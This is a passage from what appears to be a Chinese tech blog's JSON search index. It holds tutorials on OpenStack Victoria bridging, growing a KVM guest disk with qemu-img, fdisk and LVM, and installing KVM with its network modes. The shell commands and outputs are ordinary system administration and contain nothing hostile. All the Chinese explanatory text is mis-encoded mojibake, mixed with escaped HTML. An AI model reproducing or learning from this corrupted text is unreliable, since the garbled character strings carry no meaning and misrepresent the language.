id=\"é…ç½®trunkç½‘å¡\"\u003eé…ç½®trunkç½‘å¡\u003c/h4\u003e\n\u003cp\u003eä½¿ç”¨ovsåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç½‘æ¡¥ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eovs-vsctl add-br br-vlan\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ­¤æ—¶ç½‘æ¡¥\u003ccode\u003ebr-vlan\u003c/code\u003eä¸Šæ˜¯æ²¡æœ‰ä»»ä½•è™šæ‹Ÿç½‘å¡çš„ï¼Œç„¶åå…³é—­è™šæ‹Ÿæœºï¼Œåœ¨\u003ccode\u003evirt-manager\u003c/code\u003eä¸Šæ·»åŠ ä¸€ä¸ªç½‘ç»œè®¾å¤‡\u003c/p\u003e","title":"openstack victoriaç‰ˆå®‰è£…"},{"content":"ä¸€ã€é•œåƒæ‰©å®¹ æ³¨æ„ï¼šéœ€è¦å…ˆå…³é—­è™šæ‹Ÿæœºæ‰èƒ½æ“ä½œï¼Œ+å·å‰é¢æœ‰ç©ºæ ¼ï¼Œåé¢æ²¡æœ‰ç©ºæ ¼ã€‚\nqemu-img resize test.qcow2 +80G åŸé•œåƒç£ç›˜å¤§å°20GBï¼Œæ‰©å®¹å®Œæˆåå¯ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹\nqemu-img info test.qcow2 è¾“å‡º\nimage: test.qcow2 file format: qcow2 virtual size: 100G (107374182400 bytes) disk size: 885M cluster_size: 65536 Format specific information: compat: 1.1 lazy refcounts: false refcount bits: 16 corrupt: false äºŒã€Windowsç£ç›˜æ‰©å®¹ Windowsç£ç›˜æ‰©å®¹æ¯”è¾ƒæ–¹ä¾¿ï¼Œè¿›å…¥ è®¡ç®—æœºç®¡ç†\u0026gt;ç£ç›˜ç®¡ç† æ‰¾åˆ°æ–°å¢çš„åˆ†åŒºæŠŠå®ƒæ·»åŠ åˆ°éœ€è¦çš„åˆ†åŒºå³å¯ã€‚\nä¸‰ã€Linuxç£ç›˜æ‰©å®¹ å¯åŠ¨è™šæ‹Ÿæœºåï¼Œè¿›å…¥è™šæ‹Ÿæœºæ§åˆ¶å°ï¼Œä½¿ç”¨fdisk -lå‘½ä»¤æŸ¥çœ‹ç£ç›˜ä¿¡æ¯ã€‚\nDisk /dev/vda: 100 GiB, 107374182400 bytes, 209715200 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0xe11f7f01 Device Boot Start End Sectors Size Id Type /dev/vda1 * 2048 2099199 2097152 1G 83 Linux /dev/vda2 2099200 41943039 39843840 19G 8e Linux LVM Disk /dev/mapper/cl-root: 17 GiB, 18249416704 bytes, 35643392 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk /dev/mapper/cl-swap: 2 GiB, 2147483648 bytes, 4194304 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes å¯ä»¥çœ‹åˆ°è¿™å°è™šæ‹Ÿæœºçš„ç£ç›˜å¤§å°å·²ç»æœ‰100GBäº†ï¼Œä½†åˆ†åŒºå¤§å°è¿˜æ˜¯æ²¡æœ‰å˜åŒ–ï¼Œåªæœ‰åˆå§‹å¤§å°20GBã€‚\nä½¿ç”¨å‘½ä»¤fdisk /dev/vdaè¿›è¡Œåˆ†åŒºç®¡ç†ã€‚\nWelcome to fdisk (util-linux 2.32.1). Changes will remain in memory only, until you decide to write them. Be careful before using the write command. Command (m for help): n è¾“å…¥ n åˆ›å»ºä¸€ä¸ªæ–°åˆ†åŒºå¹¶å›è½¦ã€‚\nPartition type p primary (2 primary, 0 extended, 2 free) e extended (container for logical partitions) Select (default p): p æç¤ºé€‰æ‹©åˆ†åŒºï¼Œè¾“å…¥ p é€‰æ‹©ä¸»åˆ†åŒºå¹¶å›è½¦ã€‚\nPartition number (3,4, default 3): æç¤ºé€‰æ‹©åˆ†åŒºç¼–å·ï¼Œç›´æ¥å›è½¦ã€‚\nFirst sector (41943040-209715199, default 41943040): Last sector, +sectors or +size{K,M,G,T,P} (41943040-209715199, default 209715199): Created a new partition 3 of type \u0026#39;Linux\u0026#39; and of size 80 GiB. Command (m for help): t è¾“å…¥tä¿®æ”¹ç£ç›˜æ ¼å¼ã€‚\nPartition number (1-3, default 3): Hex code (type L to list all codes): 8e Changed type of partition \u0026#39;Linux\u0026#39; to \u0026#39;Linux LVM\u0026#39;. Command (m for help): w æç¤ºé€‰æ‹©åˆ†åŒºç›´æ¥å›è½¦ï¼Œæç¤ºé€‰æ‹©åå…­è¿›åˆ¶ç¼–ç ï¼Œè¾“å…¥8eå¹¶å›è½¦ï¼Œæœ€åè¾“å…¥wä¿å­˜å¹¶é€€å‡ºæ­¤æµç¨‹ã€‚\nå†æ¬¡è¾“å…¥fdisk -l æŸ¥çœ‹ç£ç›˜ä¿¡æ¯ã€‚\nDisk /dev/vda: 100 GiB, 107374182400 bytes, 209715200 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0xe11f7f01 Device Boot Start End Sectors Size Id Type /dev/vda1 * 2048 2099199 2097152 1G 83 Linux /dev/vda2 2099200 41943039 39843840 19G 8e Linux LVM /dev/vda3 41943040 209715199 167772160 80G 8e Linux LVM Disk /dev/mapper/cl-root: 17 GiB, 18249416704 bytes, 35643392 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk /dev/mapper/cl-swap: 2 GiB, 2147483648 bytes, 4194304 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes å¯ä»¥çœ‹åˆ°å·²ç»å¤šäº†ä¸€ä¸ª/dev/vda3åˆ†åŒºï¼Œå¹¶ä¸”å¤§å°ä¸º80GBã€‚\nåˆ›å»ºä¸€ä¸ªæ–°çš„pvå¹¶æ·»åŠ åˆ°è¦æ‰©å®¹çš„vgä¸­ã€‚\n[root@localhost ~]# pvcreate /dev/vda3 Physical volume \u0026#34;/dev/vda3\u0026#34; successfully created. [root@localhost ~]# [root@localhost ~]# vgextend cl /dev/vda3 Volume group \u0026#34;cl\u0026#34; successfully extended [root@localhost ~]# ä½¿ç”¨vgdisplayå¯ä»¥æŸ¥çœ‹åˆ°å·²ç»æ‰©å®¹ã€‚\n[root@localhost ~]# vgdisplay --- Volume group --- VG Name cl System ID Format lvm2 Metadata Areas 2 Metadata Sequence No 4 VG Access read/write VG Status resizable MAX LV 0 Cur LV 2 Open LV 2 Max PV 0 Cur PV 2 Act PV 2 VG Size 98.99 GiB PE Size 4.00 MiB Total PE 25342 Alloc PE / Size 4863 / \u0026lt;19.00 GiB Free PE / Size 20479 / \u0026lt;80.00 GiB VG UUID DHf6m6-x6YZ-S9ZT-VMTw-ylo5-NnLT-ozpnjR ä½¿ç”¨ df -TH æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ã€‚\n[root@localhost ~]# df -TH Filesystem Type Size Used Avail Use% Mounted on devtmpfs devtmpfs 17G 0 17G 0% /dev tmpfs tmpfs 17G 0 17G 0% /dev/shm tmpfs tmpfs 17G 9.1M 17G 1% /run tmpfs tmpfs 17G 0 17G 0% /sys/fs/cgroup /dev/mapper/cl-root xfs 19G 2.0G 17G 11% / /dev/vda1 ext4 1.1G 135M 818M 15% /boot tmpfs tmpfs 3.4G 0 3.4G 0% /run/user/0 å¯ä»¥çœ‹å‡º/dev/mapper/cl-root æŒ‚è½½åˆ°äº†æ ¹ç›®å½•ï¼Œæ­£æ˜¯æˆ‘ä»¬éœ€è¦æ‰©å®¹çš„ç£ç›˜ã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œæ‰©å®¹\nlvresize -L +80G /dev/mapper/cl-root å¤§æ¦‚ç‡ä¼šå‡ºç°\nInsufficient free space: 20480 extents needed, but only 20479 available è«åå…¶å¦™çš„è¢«å ç”¨äº†ä¸€ç‚¹ç‚¹ç£ç›˜ç©ºé—´ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹ä¸€ä¸‹æ‰©å®¹å‘½ä»¤ã€‚\nlvresize -L +79G /dev/mapper/cl-root æ ¹æ®æ–‡ä»¶ä¿¡æ¯å¯ä»¥çœ‹å‡º/dev/mapper/cl-root çš„ç±»å‹æ˜¯ xfsï¼Œxfsç±»å‹çš„ç£ç›˜ä½¿ç”¨å‘½ä»¤\nxfs_growfs /dev/mapper/cl-root å…¶ä»–ç±»å‹ä½¿ç”¨\nresize2fs /dev/mapper/cl-root æœ€åä½¿ç”¨ df -TH æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°å·²ç»æ‰©å®¹åˆ°äº†100GBã€‚\n[root@localhost ~]# df -TH Filesystem Type Size Used Avail Use% Mounted on devtmpfs devtmpfs 17G 0 17G 0% /dev tmpfs tmpfs 17G 0 17G 0% /dev/shm tmpfs tmpfs 17G 9.1M 17G 1% /run tmpfs tmpfs 17G 0 17G 0% /sys/fs/cgroup /dev/mapper/cl-root xfs 104G 2.6G 101G 3% / /dev/vda1 ext4 1.1G 135M 818M 15% /boot tmpfs tmpfs 3.4G 0 3.4G 0% /run/user/0 ","permalink":"https://www.typesafe.cn/posts/kvm-disk-resize/","summary":"\u003ch3 id=\"ä¸€é•œåƒæ‰©å®¹\"\u003eä¸€ã€é•œåƒæ‰©å®¹\u003c/h3\u003e\n\u003cp\u003eæ³¨æ„ï¼šéœ€è¦å…ˆå…³é—­è™šæ‹Ÿæœºæ‰èƒ½æ“ä½œï¼Œ\u003ccode\u003e+\u003c/code\u003eå·å‰é¢æœ‰ç©ºæ ¼ï¼Œåé¢æ²¡æœ‰ç©ºæ ¼ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eqemu-img resize test.qcow2 +80G\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåŸé•œåƒç£ç›˜å¤§å°20GBï¼Œæ‰©å®¹å®Œæˆåå¯ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eqemu-img info test.qcow2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¾“å‡º\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eimage: test.qcow2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efile format: qcow2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003evirtual size: 100G \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e107374182400\u003c/span\u003e bytes\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edisk size: 885M\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecluster_size: \u003cspan style=\"color:#ae81ff\"\u003e65536\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eFormat specific information:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    compat: 1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    lazy refcounts: false\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    refcount bits: \u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    corrupt: false\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"äºŒwindowsç£ç›˜æ‰©å®¹\"\u003eäºŒã€Windowsç£ç›˜æ‰©å®¹\u003c/h3\u003e\n\u003cp\u003eWindowsç£ç›˜æ‰©å®¹æ¯”è¾ƒæ–¹ä¾¿ï¼Œè¿›å…¥ \u003cstrong\u003eè®¡ç®—æœºç®¡ç†\u0026gt;ç£ç›˜ç®¡ç†\u003c/strong\u003e æ‰¾åˆ°æ–°å¢çš„åˆ†åŒºæŠŠå®ƒæ·»åŠ åˆ°éœ€è¦çš„åˆ†åŒºå³å¯ã€‚\u003c/p\u003e\n\u003ch3 id=\"ä¸‰linuxç£ç›˜æ‰©å®¹\"\u003eä¸‰ã€Linuxç£ç›˜æ‰©å®¹\u003c/h3\u003e\n\u003cp\u003eå¯åŠ¨è™šæ‹Ÿæœºåï¼Œè¿›å…¥è™šæ‹Ÿæœºæ§åˆ¶å°ï¼Œä½¿ç”¨\u003ccode\u003efdisk -l\u003c/code\u003eå‘½ä»¤æŸ¥çœ‹ç£ç›˜ä¿¡æ¯ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDisk /dev/vda: \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e GiB, \u003cspan style=\"color:#ae81ff\"\u003e107374182400\u003c/span\u003e bytes, \u003cspan style=\"color:#ae81ff\"\u003e209715200\u003c/span\u003e sectors\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUnits: sectors of \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e * 512 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e bytes\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSector size \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003elogical/physical\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e bytes / \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e bytes\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eI/O size \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eminimum/optimal\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e bytes / \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e bytes\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDisklabel type: dos\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDisk identifier: 0xe11f7f01\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDevice     Boot   Start      End  Sectors Size Id Type\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e/dev/vda1  *       \u003cspan style=\"color:#ae81ff\"\u003e2048\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e2099199\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e2097152\u003c/span\u003e   1G \u003cspan style=\"color:#ae81ff\"\u003e83\u003c/span\u003e Linux\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e/dev/vda2       \u003cspan style=\"color:#ae81ff\"\u003e2099200\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e41943039\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e39843840\u003c/span\u003e  19G 8e Linux LVM\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDisk /dev/mapper/cl-root: \u003cspan style=\"color:#ae81ff\"\u003e17\u003c/span\u003e GiB, \u003cspan style=\"color:#ae81ff\"\u003e18249416704\u003c/span\u003e bytes, \u003cspan style=\"color:#ae81ff\"\u003e35643392\u003c/span\u003e sectors\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUnits: sectors of \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e * 512 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e bytes\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSector size \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003elogical/physical\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e bytes / \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e bytes\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eI/O size \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eminimum/optimal\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e bytes / \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e bytes\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDisk /dev/mapper/cl-swap: \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e GiB, \u003cspan style=\"color:#ae81ff\"\u003e2147483648\u003c/span\u003e bytes, \u003cspan style=\"color:#ae81ff\"\u003e4194304\u003c/span\u003e sectors\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUnits: sectors of \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e * 512 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e bytes\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eSector size \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003elogical/physical\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e bytes / \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e bytes\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eI/O size \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eminimum/optimal\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e bytes / \u003cspan style=\"color:#ae81ff\"\u003e512\u003c/span\u003e bytes\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¯ä»¥çœ‹åˆ°è¿™å°è™šæ‹Ÿæœºçš„ç£ç›˜å¤§å°å·²ç»æœ‰100GBäº†ï¼Œä½†åˆ†åŒºå¤§å°è¿˜æ˜¯æ²¡æœ‰å˜åŒ–ï¼Œåªæœ‰åˆå§‹å¤§å°20GBã€‚\u003c/p\u003e","title":"KVM è™šæ‹Ÿæœºç£ç›˜æ‰©å®¹"},{"content":"åœ¨Windowså¹³å°ä¸Šæˆ‘ä»¬ä¹ æƒ¯äºä½¿ç”¨VmWareæˆ–è€…virtual boxæ¥å®ç°è™šæ‹ŸåŒ–ï¼Œè™½ç„¶å®ƒä»¬æ‹¥æœ‰Linuxç‰ˆæœ¬ï¼Œä½†å¤§å¤šæ•°ä¼ä¸šéƒ½é€‰æ‹©äº†ä½¿ç”¨KVMæ¥åšLinuxå¹³å°çš„è™šæ‹ŸåŒ–ï¼Œå› æ­¤å­¦ä¹ æŒæ¡KVMæ˜¯ä¸€é¡¹å¿…ä¸å¯å°‘çš„æŠ€èƒ½ã€‚\nå®‰è£…KVM ä»¥centosä¸ºä¾‹ï¼Œä¸‹é¢æ˜¯å®‰è£…KVMè™šæ‹ŸåŒ–çš„å‘½ä»¤ã€‚\nyum install -y qemu-kvm libvirt virt-install bridge-utils è¿™ä¹ˆå¤šè½¯ä»¶éƒ½æ˜¯ä»€ä¹ˆä½œç”¨ï¼Ÿ\nè½¯ä»¶ ä½œç”¨ qemu-kvm æ•´åˆäº†QEMU å’Œ KVM çš„ä¸€ä¸ªè½¯ä»¶ã€‚ libvirt å°è£…äº†QEMUçš„æ¥å£ï¼Œå¯ä»¥æ›´åŠ æ–¹ä¾¿çš„æ“ä½œè™šæ‹Ÿæœºï¼Œå¹¶ä¸”æä¾›äº†å¾ˆå¤šç§ç¼–ç¨‹è¯­è¨€çš„SDKã€‚ virt-install ç”¨æ¥åˆ›å»ºè™šæ‹Ÿæœºçš„å‘½ä»¤è¡Œå·¥å…·ã€‚ bridge-utils Linuxç½‘æ¡¥ï¼Œç”¨æ¥é…ç½®è™šæ‹Ÿæœºçš„æ¡¥æ¥ç½‘ç»œã€‚ kvmã€qemuã€qemu-kvmå’Œlibvirtåˆ°åº•æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ\nKVMï¼ˆKernel Virtual Machineï¼‰æ˜¯Linuxçš„ä¸€ä¸ªå†…æ ¸é©±åŠ¨æ¨¡å—ï¼Œå®ƒéœ€è¦CPUçš„æ”¯æŒï¼Œé‡‡ç”¨ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–æŠ€æœ¯Intel-VTã€AMD-Vï¼›å†…å­˜ç›¸å…³å¦‚Intelçš„EPTå’ŒAMDçš„RVIæŠ€æœ¯ï¼Œä½¿å¾—å®ƒèƒ½å¤Ÿè®©Linuxä¸»æœºæˆä¸ºä¸€ä¸ªHypervisorï¼ˆè™šæ‹Ÿæœºç›‘æ§å™¨ï¼‰ã€‚\nQEMUæ˜¯ä¸€ä¸ªçº¯è½¯ä»¶å®ç°çš„è™šæ‹Ÿæœºï¼Œå®ƒå¯ä»¥æ¨¡æ‹ŸCPUã€å†…å­˜ã€ç£ç›˜ç­‰å…¶ä»–ç¡¬ä»¶ï¼Œè®©è™šæ‹Ÿæœºè®¤ä¸ºè‡ªå·±åº•å±‚å°±æ˜¯ç¡¬ä»¶ï¼Œå…¶å®è¿™äº›éƒ½æ˜¯QEMUæ¨¡æ‹Ÿçš„ï¼Œè™šæ‹Ÿæœºçš„æ‰€æœ‰æ“ä½œéƒ½è¦ç»è¿‡QEMUè½¬è¯‘ä¸€å±‚ï¼Œä¹Ÿå°±å¯¼è‡´äº†QEMUæœ¬èº«çš„æ€§èƒ½è¾ƒå·®ã€‚\nqemu-kvmæ˜¯QEMUæ•´åˆäº†KVMï¼ŒæŠŠCPUè™šæ‹ŸåŒ–å’Œå†…å­˜è™šæ‹ŸåŒ–äº¤ç»™äº†KVMæ¥åšï¼Œè‡ªå·±æ¥æ¨¡æ‹ŸIOè®¾å¤‡ï¼Œä¾‹å¦‚ç½‘å¡å’Œç£ç›˜ã€‚è¿™ä¸€å¥—ç»„åˆæ‹³æ‰“ä¸‹æ¥ï¼Œæ€§èƒ½æŸå¤±å¤§å¤§é™ä½ï¼Œç›¸è¾ƒäºç›´æ¥ä½¿ç”¨ç¡¬ä»¶ï¼Œå¸¦æ¥çš„æŸè€—å¤§æ¦‚åœ¨1%-2%ä¹‹é—´ã€‚\nlibvirtæ˜¯ç›®å‰ä½¿ç”¨æœ€ä¸ºå¹¿æ³›çš„å¯¹KVMè™šæ‹Ÿæœºè¿›è¡Œç®¡ç†çš„å·¥å…·å’ŒAPIã€‚Libvirtdæ˜¯ä¸€ä¸ªdaemonè¿›ç¨‹ï¼Œå¯ä»¥è¢«æœ¬åœ°çš„virshè°ƒç”¨ï¼Œä¹Ÿå¯ä»¥è¢«è¿œç¨‹çš„virshè°ƒç”¨ï¼ŒLibvirtdè°ƒç”¨qemu-kvmæ“ä½œè™šæ‹Ÿæœºã€‚\nå¯åŠ¨libvirt\nsystemctl start libvirtd systemctl enable libvirtd å¦‚æœä½ ä¸æƒ³ä½¿ç”¨å‘½ä»¤è¡Œå·¥å…·æ¥ç®¡ç†è™šæ‹Ÿæœºï¼Œå¯ä»¥å®‰è£… virt-manager ã€‚\nyum install -y virt-manager åœ¨æ”¯æŒx11è½¬å‘çš„sshå®¢æˆ·ç«¯ï¼ˆä¾‹å¦‚ï¼šMobaXtermï¼‰ä¸Šå¯ä»¥ç›´æ¥è¾“å…¥ virt-manager æ¥å¯åŠ¨ã€‚\nè™šæ‹Ÿç½‘ç»œç±»å‹ å’Œvmwareç±»å‹ï¼Œkvmä¹Ÿæ”¯æŒå¤šç§ç±»å‹çš„ç½‘ç»œï¼Œä¸»è¦åˆ†ä¸ºä¸‰ç§ã€‚\nNATæ¨¡å¼ è™šæ‹Ÿæœºéœ€è¦æŠŠæµé‡å‘é€åˆ°å®¿ä¸»æœºï¼Œå®¿ä¸»æœºå™¨è½¬æ¢ç½‘ç»œä¿¡æ¯åå†å‘å‡ºï¼Œå¤–éƒ¨æœºå™¨æ— æ³•æ„ŸçŸ¥åˆ°è™šæ‹Ÿæœºçš„å­˜åœ¨ã€‚æ­¤ç§æ–¹å¼å®¿ä¸»æœºå™¨ç›¸å½“äºä¸€ä¸ªè·¯ç”±å™¨ï¼Œå› æ­¤å®¿ä¸»æœºä¸Šä¼šæœ‰ä¸€ä¸ªå’Œè™šæ‹ŸæœºåŒç½‘æ®µçš„IPï¼Œå¹¶ä¸”è™šæ‹Ÿæœºçš„ç½‘å…³åœ°å€æ˜¯å®¿ä¸»æœºçš„è¿™ä¸ªIPã€‚\nä¸»æœºæ¨¡å¼ è™šæ‹Ÿæœºåªèƒ½äº’ç›¸è®¿é—®ï¼Œä¸èƒ½è®¿é—®å®¿ä¸»æœºã€‚æ­¤ç§æ–¹å¼ä¸NATæ¨¡å¼ç±»ä¼¼ï¼Œä½†å®ƒæ²¡æœ‰ä¸è™šæ‹ŸæœºåŒç½‘æ®µçš„IPï¼Œå› æ­¤è™šæ‹Ÿæœºä¹Ÿä¸èƒ½å€ŸåŠ©äºå®¿ä¸»æœºæ¥è®¿é—®å¤–éƒ¨ç½‘ç»œã€‚\næ¡¥æ¥æ¨¡å¼ è™šæ‹Ÿæœºå’Œå®¿ä¸»æœºéƒ½å…³è”åœ¨ä¸€ä¸ªç½‘æ¡¥ä¸Šï¼Œå› æ­¤è™šæ‹Ÿæœºå¯ä»¥ä¸å®¿ä¸»æœºåœ¨åŒä¸€ä¸ªç½‘æ®µï¼Œå¹¶ä¸”å¤–éƒ¨æœºå™¨å¯ä»¥ç›´æ¥è®¿é—®åˆ°è™šæ‹Ÿæœºï¼Œè™šæ‹Ÿæœºä¹Ÿå¯ä»¥å€ŸåŠ©ç½‘æ¡¥æ¥è®¿é—®å¤–éƒ¨ç½‘ç»œã€‚\nè¿˜æœ‰ä¸€ç§æ¨¡å¼åœ¨openstackç­‰äº‘å¹³å°ä¸Šä½¿ç”¨è¾ƒä¸ºå¹¿æ³›ï¼Œç½‘æ¡¥ä¸Šç»‘å®šçš„ç‰©ç†ç½‘å¡æ²¡æœ‰IPï¼Œå¯¹åº”äº¤æ¢æœºé…ç½®ç«¯å£ä¸ºtrunkæ¨¡å¼ï¼Œè™šæ‹Ÿæœº 